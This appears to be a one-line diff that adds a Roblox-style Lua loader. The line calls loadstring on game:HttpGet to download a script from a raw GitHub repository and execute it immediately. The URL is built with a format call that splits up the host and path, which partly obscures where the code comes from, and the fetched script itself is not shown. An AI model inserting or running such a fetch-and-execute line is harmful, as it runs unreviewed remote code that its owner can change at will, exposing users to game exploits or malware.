@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.%s/%s/%s'):format('githubusercontent.com','anda644659/jsjs/refs/heads/main','jsjs.lua')))()
